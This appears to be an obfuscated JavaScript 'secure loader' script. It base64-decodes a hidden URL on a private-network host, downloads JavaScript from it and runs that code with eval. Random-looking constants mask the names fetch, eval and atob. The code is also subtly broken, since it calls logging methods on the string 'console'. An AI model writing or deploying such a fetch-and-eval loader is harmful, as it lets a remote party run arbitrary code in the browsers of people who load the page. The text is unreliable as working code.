(function() {
    'use strict';
    
    const xG5rKVcv = 'fetch';
    const O5bBbBpT = 'text';
    const McrXg22a = 'eval';
    const MA4xYpxs = 'console';
    const eham214T = 'error';
    const EZnGIXWl = 'log';
    const UNY2IxvK = 'atob';
    
    function AB0aPczf(msg, data) {
        MA4xYpxs.EZnGIXWl('[SECURE_LOADER]', msg, data || '');
    }
    
    AB0aPczf('Starting secure loader...');
    
    const vySZVIFZ = 'aHR0cDovLzE5Mi4xNjguMS45Mjo1MDAwL2pzL3NlY3VyZV9sb2FkZXJfc05VTFdYRm8zQ05uTWVyTi5qcw==';
    
    AB0aPczf('Encoded URL:', vySZVIFZ);
    AB0aPczf('Payload ID:', 'sNULWXFo3CNnMerN');
    
    const ovNQ7RwE = UNY2IxvK(vySZVIFZ);
    AB0aPczf('Decoded URL:', ovNQ7RwE);
    
    window[xG5rKVcv](ovNQ7RwE)
    .then(response => {
        AB0aPczf('Response received:', response.status, response.statusText);
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        return response[O5bBbBpT]();
    })
    .then(jsCode => {
        AB0aPczf('JavaScript code received, length:', jsCode.length);
        try {
            AB0aPczf('Executing JavaScript code...');
            McrXg22a(jsCode);
            AB0aPczf('JavaScript executed successfully');
        } catch (e) {
            MA4xYpxs.eham214T('[SECURE_LOADER] JavaScript execution failed:', e);
        }
    })
    .catch(error => {
        MA4xYpxs.eham214T('[SECURE_LOADER] Request failed:', error);
    });
})();
